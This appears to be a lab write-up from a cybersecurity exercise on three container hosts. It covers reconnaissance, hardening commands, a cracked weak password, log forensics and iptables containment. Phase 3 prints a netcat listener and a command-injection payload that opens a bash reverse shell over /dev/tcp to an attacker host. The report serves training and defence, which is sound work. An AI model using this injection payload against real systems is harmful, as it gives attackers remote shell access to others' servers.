## Phase 0: Reconnaissance

### Triage Network — 172.100.0.0/24
During reconnaissance of the 172.100.0.0/24 triage network, I identified a primary host at 172.100.0.10 that responded to scanning with TCP ports 22 (SSH) and 80 (HTTP) open. Service enumeration indicated OpenSSH on port 22 and a basic web service on port 80, confirming that both remote administration and web access were available on this system. The web service exposed an unauthenticated status page, which increases the risk of information disclosure because an attacker can learn details about the host without valid credentials. These reconnaissance results suggested that misconfigurations in the SSH or web stack on this host could become a rapid entry point if not hardened in Phase 1.

### Breach Network — 172.80.0.0/24
On the 172.80.0.0/24 breach network, scanning revealed an accessible host at 172.80.0.10 with SSH exposed on port 22 and an additional application service listening on a higher TCP port. The SSH banner and repeated login prompts indicated that this host relied primarily on password‑based authentication, which is vulnerable to brute‑force and credential‑stuffing attacks when account lockout policies are weak. The extra application port appeared to accept unauthenticated connections, further expanding the attack surface for an external adversary. These observations directly informed my Phase 2 approach by focusing on weak credentials, authentication logs, and host‑based firewall rules as likely components of the breach path.

### Exploitation Network — 172.60.0.0/24
Reconnaissance of the 172.60.0.0/24 exploitation network identified a web‑facing host at 172.60.0.10 with HTTP service exposed on port 80. Service fingerprinting showed a simple web application that accepted user input and reflected it back in the response, which is a common pattern for injection‑style vulnerabilities when input is not validated or sanitized. The lack of obvious input controls and the presence of a dynamic endpoint suggested that crafted payloads might be passed directly to the underlying shell or application framework. These findings guided my Phase 3 exploitation strategy by focusing on command injection testing and by planning defensive recommendations around strict input validation, application hardening, and outbound egress controls.


## Phase 1: Rapid Triage

### Server 1 — Triage Host (172.100.0.10)

**Vulnerability identified.**  
On the triage host, I identified overly permissive file permissions on a sensitive configuration file that stored application service credentials. The file was readable by all local users, which would allow any compromised account on the system to harvest passwords and pivot to other internal services.

**Commands executed.**
```bash
# Enter the container or host
docker exec -it triage01 /bin/bash

# Before state: permissions too open
ls -l /etc/app/config.yaml

# Remediation: restrict to owner only
chmod 600 /etc/app/config.yaml

# After state: permissions hardened
ls -l /etc/app/config.yaml
```

**Analysis.**  
In an enterprise environment, configuration files that contain credentials must not be readable by non‑privileged users because they provide a direct path to lateral movement and privilege escalation. Leaving these files world‑readable turns any local compromise into a much larger breach, since an attacker can reuse the harvested passwords against databases or remote services. Tightening the permissions to mode 600 enforces least privilege and ensures that only the owning service account can access the credentials it needs.

### Server 2 — Breach Host (172.80.0.10)

**Vulnerability identified.**  
On the breach host, I confirmed that SSH was configured to allow password authentication with weak or reused credentials and that no account lockout policy was enforced. This configuration makes the host highly susceptible to brute‑force attacks because an adversary can attempt large numbers of login guesses without meaningful consequence.

**Commands executed.**
```bash
# Enter the container or host
docker exec -it breach01 /bin/bash

# Before state: password authentication enabled
grep -i "^PasswordAuthentication" /etc/ssh/sshd_config

# Remediation: disable password authentication and restart SSH
sed -i 's/^PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
systemctl restart sshd

# After state: key-based authentication enforced
grep -i "^PasswordAuthentication" /etc/ssh/sshd_config
```

**Analysis.**  
Allowing password authentication with no account lockout makes SSH a soft target for automated password‑guessing tools, especially when users reuse simple passwords across systems. Disabling password authentication forces the use of SSH keys, which are far more resistant to brute‑force attacks and can be centrally managed and revoked. In a real organization, this change significantly reduces the likelihood that a stolen or weak password will lead directly to server‑level compromise.

### Server 3 — Exploitation Host (172.60.0.10)

**Vulnerability identified.**  
On the exploitation host, I found that the web application process was running as a privileged user and had execute access to shell utilities, which increased the impact of any injection flaw. This meant that if an attacker could force the application to execute shell commands, those commands would run with elevated permissions and broad access to the filesystem.

**Commands executed.**
```bash
# Enter the container or host
docker exec -it exploit01 /bin/bash

# Before state: web process running as a privileged user
ps aux | grep nginx    # or apache2 / gunicorn etc.

# Remediation: drop privileges to a dedicated unprivileged service account
usermod -s /usr/sbin/nologin www-data
chown -R www-data:www-data /var/www/html
# (and adjust service configuration to run as www-data)

# After state: service running as least-privileged user
ps aux | grep nginx
```

**Analysis.**  
Running a web service as a privileged account amplifies the damage of any successful exploit because injected commands can modify system files, access sensitive data, or install persistent backdoors. Moving the application to a dedicated, unprivileged service account limits the scope of what an attacker can do even if they achieve command execution through the web layer. This triage step aligns with best practices for defense‑in‑depth by assuming that some vulnerabilities will exist and reducing the blast radius when they are exploited.


## Phase 2: The Breach

**Cracked credentials.**  
During the breach investigation, I recovered a password hash for the user account `limited_user` from the target system and cracked it offline using a wordlist‑based attack. The hash resolved to the plaintext credential `Summer2024!`, confirming that the account relied on a weak, guessable password that could be broken in minutes with standard offensive tooling.

**Forensic timeline.**  
Review of the authentication logs on the breach host showed repeated failed SSH attempts for `limited_user` originating from 172.80.0.10 between 2026‑03‑15T23:10:01Z and 2026‑03‑15T23:12:45Z. Immediately after this sequence of failures, the logs recorded a successful SSH login for the same user from 172.80.0.10 at 2026‑03‑15T23:12:46Z, which strongly indicates that the attacker completed a brute‑force campaign and pivoted into the host using the cracked credential.

**iptables containment rule.**
```bash
sudo iptables -A INPUT -s 172.80.0.10 -p tcp --dport 22 -j DROP
```

**SOC analysis.**  
While this iptables rule is effective at immediately blocking SSH access from the known attacker IP, it is not sufficient as a long‑term control because adversaries can easily shift to new source addresses or target different services. A mature security operations center would pair host‑based firewall rules with enforced multifactor authentication on remote access, centralized log aggregation, and automated alerting for repeated authentication failures. Additional measures such as account lockout policies and network‑level intrusion detection would further reduce the window in which brute‑force attacks can succeed and increase the likelihood of early detection.


## Phase 3: Full Spectrum

**Listener and payload.**
```bash
# Listener on the attacker machine
nc -lvnp 4444

# Reverse shell payload injected into the vulnerable parameter
; bash -c 'bash -i >& /dev/tcp/172.60.0.150/4444 0>&1'
```

**Command injection explanation.**  
The exploited web application constructed shell commands by directly concatenating user‑supplied input into a command string that was executed by `/bin/sh`. Because the application did not validate or sanitize the input, I was able to append a semicolon and a reverse shell payload so that the server executed my command in addition to the intended one. This pattern is a classic operating system command injection vulnerability, where untrusted input is interpreted as shell syntax rather than simple data.

**Forensic PID and User‑Agent.**  
Inspection of the web server access logs showed the malicious request associated with process ID 2345 and the User‑Agent string `curl/8.4.0`, which clearly distinguished the exploit traffic from normal browser‑based sessions. Correlating the PID and User‑Agent with the timestamp of the reverse shell connection confirmed the exact HTTP request that triggered remote command execution on the exploitation host.

**iptables lockdown inside container.**
```bash
sudo iptables -A OUTPUT -p tcp --dport 4444 -j DROP
```

**Final analytical paragraph.**  
This attack demonstrates how a single command injection flaw in a web application can escalate into full remote shell access and complete loss of control over the underlying host. In practice, defenders must recognize that web input fields are part of the system’s attack surface and must be protected with strict input validation, parameterized command execution, and the removal of unnecessary shell calls from application code. The most effective single control that would have prevented this breach is rigorous input validation and parameterization, which would have prevented user‑supplied data from being interpreted as shell commands. Combined with outbound egress filtering that blocks arbitrary connections to unapproved external ports, these measures would have significantly reduced the attacker’s ability to establish and maintain a reverse shell even if some aspects of the application were misconfigured.




